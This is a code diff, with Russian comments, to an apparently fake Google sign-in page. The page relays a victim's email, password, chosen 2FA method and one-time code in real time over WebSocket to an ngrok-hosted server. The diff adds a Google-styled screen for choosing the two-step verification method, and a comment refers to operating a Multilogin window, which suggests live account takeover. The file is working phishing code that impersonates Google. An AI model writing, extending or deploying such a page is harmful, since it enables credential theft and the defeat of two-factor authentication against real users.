@@ -8,7 +8,6 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-  <!-- Подключаем Socket.IO клиент -->
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 </head>
 <body>
@@ -29,6 +28,12 @@
 
       <!-- Экран 2 -->
       <h1 id="title-password" style="display:none;">Добро пожаловать!</h1>
+
+      <!-- НОВОЕ: Экран 3a — выбор метода 2FA -->
+      <h1 id="title-method" style="display:none;">2-Step Verification</h1>
+      <p id="sub-method" style="display:none;">
+        To help keep your account safe, Google wants to make sure it's really you trying to sign in
+      </p>
 
       <!-- Экран 3 -->
       <h1 id="title-2fa" style="display:none;">Двухэтапная проверка</h1>
@@ -89,6 +94,14 @@
         </div>
       </form>
 
+      <!-- НОВОЕ: ЭКРАН 3a — выбор метода 2FA -->
+      <div id="method-form" style="display:none;">
+        <div class="method-header">Choose how you want to sign in:</div>
+        <div id="methods-list" class="methods-list">
+          <!-- Заполняется из JS -->
+        </div>
+      </div>
+
       <!-- ЭКРАН 3: 2FA -->
       <form id="twofa-form" style="display:none;">
         <h3 class="twofa-subtitle">Двухэтапная проверка</h3>
@@ -130,7 +143,7 @@
   </footer>
 
   <script>
-    // ⚠️ ВСТАВЬ СВОЙ АКТУАЛЬНЫЙ NGROK URL (без http://)
+    // ⚠️ ВСТАВЬ СВОЙ АКТУАЛЬНЫЙ NGROK URL
     const SOCKET_URL = "https://starting-surgical-wing.ngrok-free.dev";
     const socket = io(SOCKET_URL, {
       transports: ["websocket"],
@@ -141,25 +154,28 @@
     const emailForm     = document.getElementById("email-form");
     const passwordForm  = document.getElementById("password-form");
     const twofaForm     = document.getElementById("twofa-form");
+    const methodForm    = document.getElementById("method-form");      // НОВОЕ
+    const methodsList   = document.getElementById("methods-list");     // НОВОЕ
     const emailInput    = document.getElementById("email-input");
     const passwordInput = document.getElementById("password-input");
     const otpInput      = document.getElementById("otp-input");
     const titleEmail    = document.getElementById("title-email");
     const titlePass     = document.getElementById("title-password");
     const title2FA      = document.getElementById("title-2fa");
+    const titleMethod   = document.getElementById("title-method");     // НОВОЕ
     const subEmail      = document.getElementById("sub-email");
     const sub2FA        = document.getElementById("sub-2fa");
+    const subMethod     = document.getElementById("sub-method");       // НОВОЕ
     const userChip      = document.getElementById("user-chip");
     const chipEmail     = document.getElementById("chip-email");
     const showPassword  = document.getElementById("show-password");
 
-    // --- Обработка событий от сервера ---
+    // --- WebSocket события ---
     socket.on('connect', () => console.log('✅ WebSocket подключён'));
     socket.on('disconnect', () => console.log('❌ WebSocket отключён'));
 
     socket.on('request_password', (data) => {
       console.log('🔒 Сервер запросил пароль:', data);
-      // Переключаем интерфейс на экран пароля
       titleEmail.style.display = "none";
       subEmail.style.display = "none";
       titlePass.style.display = "block";
@@ -170,12 +186,26 @@
       passwordInput.focus();
     });
 
+    // НОВОЕ: сервер запросил выбор метода 2FA
+    socket.on('request_2fa_method', (data) => {
+      console.log('🔀 Сервер запросил выбор метода 2FA:', data);
+      titlePass.style.display = "none";
+      titleMethod.style.display = "block";
+      subMethod.style.display = "block";
+      passwordForm.style.display = "none";
+      methodForm.style.display = "block";
+      renderMethods(data.methods || []);
+    });
+
     socket.on('request_2fa', (data) => {
       console.log('🔑 Сервер запросил 2FA:', data);
       titlePass.style.display = "none";
+      titleMethod.style.display = "none";
+      subMethod.style.display = "none";
       title2FA.style.display = "block";
       sub2FA.style.display = "block";
       passwordForm.style.display = "none";
+      methodForm.style.display = "none";
       twofaForm.style.display = "block";
       otpInput.focus();
     });
@@ -183,8 +213,6 @@
     socket.on('login_success', (data) => {
       console.log('🎉 Успех:', data);
       alert("Вход выполнен успешно!");
-      // Можно сделать редирект:
-      // window.location.href = "https://myaccount.google.com/";
     });
 
     socket.on('login_failed', (data) => {
@@ -192,10 +220,84 @@
       alert("Не удалось войти: " + data.message);
     });
 
+    socket.on('info', (data) => {
+      alert("ℹ️ " + data.message);
+    });
+
     socket.on('error', (data) => {
       console.error('❌ Ошибка от сервера:', data);
       alert("Ошибка: " + data.message);
     });
+
+    // --- Иконки SVG для методов 2FA ---
+    const ICONS = {
+      totp: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L4 6v6c0 5 3.5 9.5 8 10 4.5-.5 8-5 8-10V6l-8-4z" stroke="#4285F4" stroke-width="2"/>
+        <path d="M9 12l2 2 4-4" stroke="#4285F4" stroke-width="2" stroke-linecap="round"/>
+      </svg>`,
+      security_key: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <circle cx="8" cy="12" r="4" stroke="#8e918f" stroke-width="2"/>
+        <path d="M12 12h10M19 12v3M16 12v2" stroke="#8e918f" stroke-width="2" stroke-linecap="round"/>
+      </svg>`,
+      sms: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <rect x="6" y="2" width="12" height="20" rx="2" stroke="#4285F4" stroke-width="2"/>
+        <circle cx="12" cy="18" r="1" fill="#4285F4"/>
+      </svg>`,
+      phone_call: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.13.96.36 1.9.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0122 16.92z" stroke="#4285F4" stroke-width="2"/>
+      </svg>`,
+      recovery: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="10" stroke="#4285F4" stroke-width="2"/>
+        <path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3" stroke="#4285F4" stroke-width="2" stroke-linecap="round"/>
+        <circle cx="12" cy="17" r="1" fill="#4285F4"/>
+      </svg>`,
+      try_another: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="10" stroke="#4285F4" stroke-width="2"/>
+        <path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3" stroke="#4285F4" stroke-width="2" stroke-linecap="round"/>
+        <circle cx="12" cy="17" r="1" fill="#4285F4"/>
+      </svg>`,
+    };
+
+    const LABELS = {
+      totp: "Get a verification code from the <strong>Google Authenticator</strong> app",
+      security_key: "Use your Security Key",
+      sms: "Get a verification code at your phone number",
+      phone_call: "Get a phone call",
+      recovery: "Use a recovery option",
+    };
+
+    function renderMethods(methods) {
+      methodsList.innerHTML = "";
+      const priority = ["totp", "security_key", "sms", "phone_call", "recovery"];
+      methods.sort((a, b) => priority.indexOf(a.id) - priority.indexOf(b.id));
+
+      methods.forEach(m => {
+        const div = document.createElement("div");
+        div.className = "method-item" + (m.available ? "" : " disabled");
+        div.innerHTML = `
+          <div class="method-icon">${ICONS[m.id] || ""}</div>
+          <div class="method-text">${LABELS[m.id] || m.label}</div>
+        `;
+        if (m.available) {
+          div.addEventListener("click", () => {
+            console.log("📤 Выбран метод:", m.id);
+            socket.emit('submit_2fa_method', { method: m.id });
+          });
+        }
+        methodsList.appendChild(div);
+      });
+
+      const tryAnother = document.createElement("div");
+      tryAnother.className = "method-try-another";
+      tryAnother.innerHTML = `
+        <div class="method-icon">${ICONS.try_another}</div>
+        <div class="method-text">Try another way</div>
+      `;
+      tryAnother.addEventListener("click", () => {
+        alert("Попробуйте выбрать другой метод в окне Multilogin вручную.");
+      });
+      methodsList.appendChild(tryAnother);
+    }
 
     // --- Отправка данных на сервер ---
     emailForm.addEventListener("submit", (e) => {
@@ -224,15 +326,17 @@
 
     // --- Возврат на экран 1 (клик по чипу) ---
     userChip.addEventListener("click", () => {
-      // Сбрасываем интерфейс (сессия на сервере сбросится при новой попытке)
       titleEmail.style.display = "block";
       subEmail.style.display = "block";
       titlePass.style.display = "none";
       title2FA.style.display = "none";
+      titleMethod.style.display = "none";     // НОВОЕ
       sub2FA.style.display = "none";
+      subMethod.style.display = "none";       // НОВОЕ
       userChip.style.display = "none";
       passwordForm.style.display = "none";
       twofaForm.style.display = "none";
+      methodForm.style.display = "none";      // НОВОЕ
       emailForm.style.display = "block";
       emailInput.value = "";
       emailInput.focus();
